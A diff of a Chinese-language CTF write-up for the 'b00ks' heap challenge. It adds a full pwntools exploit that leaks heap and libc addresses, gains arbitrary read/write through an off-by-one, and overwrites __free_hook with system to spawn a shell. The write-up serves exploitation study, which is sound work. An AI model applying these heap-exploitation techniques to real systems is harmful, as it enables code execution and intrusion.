@@ -170,15 +170,14 @@ signed __int64 __fastcall read_str(_BYTE *ptr, int len_1)
 首先我们可以利用 `author_name` 在 `.bss` 区的溢出漏洞，打印 `GLOBAL_LIBRARY` 第一项的内容，而这一项是一个指向 `heap` 段的地址，通过这个方法我们可以泄露堆地址：
 
 ```python
-    def leak_heap_addr(self):
+        # todo: leak heap addr
         self.set_author_name("A" * 32)
-        self.create(0x18, "LeakHeap", 0x18, "LeakDesc")
+        self.create(0x18, "B" * 0x18, 0x100, "C" * 0x100)  # 1
         self.detail()
-        author = [ld["Author"] for ld in self.library_detail if ld["Name"] == "LeakHeap"]
-        print author
+        author = [ld["Author"] for ld in self.library_detail if ld["ID"] == "1"]
         assert len(author) == 1
-        self.lib0_heap_addr = u64(author[0][32:] + "\x00\x00")
-        print hex(self.lib0_heap_addr)
+        library0 = u64(author[0][32:] + "\x00\x00")
+        print "leak library0 address: %s" % hex(library0)
 ```
 
 泄露之后发现这个泄露的堆地址是 `0x55C106CBC2B0`，然后我们动态调式查看堆地址的内容可以发现：
@@ -268,25 +267,17 @@ signed __int64 __fastcall read_str(_BYTE *ptr, int len_1)
 泄露的脚本如下：
 
 ```python
-    def leak_heap_addr(self):
-        self.set_author_name("A" * 32)
-        self.create(0x18, "LeakHeap", 0x100, "LeakDesc")
-        self.detail()
-        author = [ld["Author"] for ld in self.library_detail if ld["Name"] == "LeakHeap"]
-        assert len(author) == 1
-        self.library[0] = u64(author[0][32:] + "\x00\x00")
-        print hex(self.library[0])
-
-    def get_addr_write(self):
-        self.create(0x20, "GetAddrWrite", 0x20, "WriteDesc")
-        offset = self.library[0] & 0xff
+        # todo: get arbitrary address write&read
+        self.create(0x20, "D" * 0x20, 0x20, "E" * 0x20)  # 2
+        offset = library0 & 0xff
         assert offset >= 0x20
-        payload = "A"*(0x100+0x10 - offset) + p64(0x1) \
-                  + p64(self.library[0] + 0x20 + 0x10) \
-                  + p64(self.library[0] + 0x20 + 0x30 + 0x30 + 0x10) \
+        payload = "C"*(0x100+0x10 - offset) + p64(0x1) \
+                  + p64(library0 + 0x20 + 0x10) \
+                  + p64(library0 + 0x20 + 0x30 + 0x30 + 0x10 + 0x10) \
                   + p64(0x100)
         self.edit(1, payload)
-        self.set_author_name("B" * 32)
+        self.set_author_name("A" * 32)
+        print "get arbitrary address write&read"
 ```
 
 可以通过下面两个函数进行任意读写：
@@ -301,14 +292,181 @@ signed __int64 __fastcall read_str(_BYTE *ptr, int len_1)
         self.detail()
         desc = [ld["Description"] for ld in self.library_detail if ld["ID"] == "2"]
         assert len(desc) == 1
-        return u64(desc[0][:8])
+        return u64((desc[0] + "\x00\x00")[:8])
 ```
 
 ### leak_libc
 
 除此之外我们还需要泄露 `libc地址/栈地址`，之后通过写 `got` 表劫持流程或者写 `__malloc_hook` 劫持流程等。
 
-因为 `off-by-one` 漏洞的存在，我们可以利用 `unlink` 方法，因为此时堆区就被放入了`bins` 的双向链表中，这样就可以将 `main_arena.bins` 的地址写入堆区中。
+因为 `off-by-one` 漏洞的存在，我们可以利用 `unlink` 方法，因为此时堆区就被放入了`unsorted bins` 的双向链表中，这样就可以将 `main_arena.bins` 的地址写入堆区中。
 
-但是我们本地调试环境是 `libc 2.28`，在 `2.26` 之后通过上面描述的这种方式 `unsorted bin attack` 并不可以泄露 `libc` 地址。我们可以使用 `Tcache Attack` 进行攻击。
+但是我们本地调试环境是 `libc 2.28`，在 `2.26` 之后 `glibc` 引入了 `tcache` 机制，我们需要先释放 7 个 `chunk` 填充 `tcache` 垃圾箱，从第八个开始才会进入 `unsorted bins`。代码如下：
+
+```python
+        # todo: leak libc address via unsorted bin address
+        for i in range(4):
+            self.create(0x100, "F" * 0x100, 0x100, "G" * 0x100)  # 3,4,5,6
+        for i in range(4):
+            self.delete(i + 3)  # 3,4,5,6
+        libcbase = self.read_from(library0 + 0x8c0) - 0x1bbca0
+        print "leak libc base address: %s" % hex(libcbase)
+```
+
+### write `__free_hook`
+
+在 `libc` 的 `free` 函数执行之前，会检查一个地址中是否存在函数。如果存在则传入目标地址并且执行它，这个地址叫做 `__free_hook`，我们可以将这个地址指向 `system` 函数，触发释放就可以得到 `shell`。
+
+为了执行 `system("/bin/sh")`，我们需要执行以下的两步操作：
+
+1. 将 `/bin/sh` 字符串写入需要释放的内存区域中；
+2. 将 `__free_hook` 对应的地址指向 `system` 函数。
+
+```python
+        # todo:
+        #   1. write "/bin/sh" to library[2] name
+        #   2. replace `__free_hook` as `system`
+        bin_sh_addr = libcbase + next(self.libc.search("/bin/sh"))
+        free_hook_addr = libcbase + self.libc.symbols["__free_hook"]
+        system_addr = libcbase + self.libc.symbols["system"]
+        print "'/bin/sh' address: %x" % bin_sh_addr
+        print "_free_hook address: %x" % free_hook_addr
+        print "system address: %x" % system_addr
+        self.create(0x20, "/bin/sh", 0x20, "/bin/sh")  # 7
+        self.write_to(free_hook_addr, p64(system_addr))
+```
+
+### get_shell
+
+最后就可以触发释放函数拿到主机 shell：
+
+```python
+        # todo: get shell
+        self.p.sendline("2")
+        self.p.sendlineafter("Enter the book id you want to delete: ", "7")
+        self.p.interactive()
+```
+
+## 脚本
+
+完整的 `exp.py` 如下：
+
+```python
+#!/usr/bin/env python2
+# coding=utf-8
+from pwn import *
+
+
+class Challenge:
+    def __init__(self, local=True):
+        self.local = local
+        self.p = process(["./b00ks"])
+        self.libc = ELF("/lib/x86_64-linux-gnu/libc-2.28.so")
+        self.library_detail = []
+
+    def gdb(self, script):
+        assert self.local
+        context.terminal = ['tmux', 'splitw', '-h']
+        gdb.attach(proc.pidof(self.p)[0], gdbscript=script)
+
+    def create(self, book_name_size, book_name, desc_size, description):
+        self.p.sendline("1")
+        self.p.sendlineafter("Enter book name size: ", str(book_name_size))
+        self.p.sendlineafter("Enter book name (Max 32 chars): ", book_name)
+        self.p.sendlineafter("Enter book description size: ", str(desc_size))
+        self.p.sendlineafter("Enter book description: ", description)
+        self.p.recvuntil("> ")
+
+    def delete(self, book_id):
+        self.p.sendline("2")
+        self.p.sendlineafter("Enter the book id you want to delete: ", str(book_id))
+        self.p.recvuntil("> ")
+
+    def edit(self, book_id, new_desc):
+        self.p.sendline("3")
+        self.p.sendlineafter("Enter the book id you want to edit: ", str(book_id))
+        self.p.sendlineafter("Enter new book description: ", new_desc)
+        self.p.recvuntil("> ")
+
+    def detail(self):
+        self.p.sendline("4")
+        detail = self.p.recvuntil("\n\n")
+        self.library_detail = [
+            {
+                ("ID" if len(item) == 1 else item[0]): (item[0] if len(item) == 1 else item[1])
+                for item in [i.split(": ") for i in dp.strip("\n").split("\n")]
+            } for dp in detail.split("\nID: ")
+        ]
+        self.p.recvuntil("> ")
+
+    def set_author_name(self, author_name, init=False):
+        if not init:
+            self.p.sendline("5")
+        self.p.sendlineafter("Enter author name: ", author_name)
+        self.p.recvuntil("> ")
+
+    def write_to(self, addr, content):
+        self.edit(1, p64(addr) + p64(len(content) + 1))
+        self.edit(2, content)
+
+    def read_from(self, addr):
+        self.edit(1, p64(addr))
+        self.detail()
+        desc = [ld["Description"] for ld in self.library_detail if ld["ID"] == "2"]
+        assert len(desc) == 1
+        return u64((desc[0] + "\x00\x00")[:8])
+
+    def pwn(self):
+        self.set_author_name("shesl-meow", init=True)
+        # todo: leak heap addr
+        self.set_author_name("A" * 32)
+        self.create(0x18, "B" * 0x18, 0x100, "C" * 0x100)  # 1
+        self.detail()
+        author = [ld["Author"] for ld in self.library_detail if ld["ID"] == "1"]
+        assert len(author) == 1
+        library0 = u64(author[0][32:] + "\x00\x00")
+        print "leak library0 address: %s" % hex(library0)
+
+        # todo: get arbitrary address write&read
+        self.create(0x20, "D" * 0x20, 0x20, "E" * 0x20)  # 2
+        offset = library0 & 0xff
+        assert offset >= 0x20
+        payload = "C"*(0x100+0x10 - offset) + p64(0x1) \
+                  + p64(library0 + 0x20 + 0x10) \
+                  + p64(library0 + 0x20 + 0x30 + 0x30 + 0x10 + 0x10) \
+                  + p64(0x100)
+        self.edit(1, payload)
+        self.set_author_name("A" * 32)
+        print "get arbitrary address write&read"
+
+        # todo: leak libc address via unsorted bin address
+        for i in range(4):
+            self.create(0x100, "F" * 0x100, 0x100, "G" * 0x100)  # 3,4,5,6
+        for i in range(4):
+            self.delete(i + 3)  # 3,4,5,6
+        libcbase = self.read_from(library0 + 0x8c0) - 0x1bbca0
+        print "libc base address: %x" % libcbase
+
+        # todo:
+        #   1. write "/bin/sh" to library[2] name
+        #   2. replace `__free_hook` as `system`
+        bin_sh_addr = libcbase + next(self.libc.search("/bin/sh"))
+        free_hook_addr = libcbase + self.libc.symbols["__free_hook"]
+        system_addr = libcbase + self.libc.symbols["system"]
+        print "'/bin/sh' address: %x" % bin_sh_addr
+        print "_free_hook address: %x" % free_hook_addr
+        print "system address: %x" % system_addr
+        self.create(0x20, "/bin/sh", 0x20, "/bin/sh")  # 7
+        self.write_to(free_hook_addr, p64(system_addr))
+
+        # todo: get shell
+        self.p.sendline("2")
+        self.p.sendlineafter("Enter the book id you want to delete: ", "7")
+        self.p.interactive()
+
+
+if __name__ == "__main__":
+    c = Challenge()
+    c.pwn()
+```
 
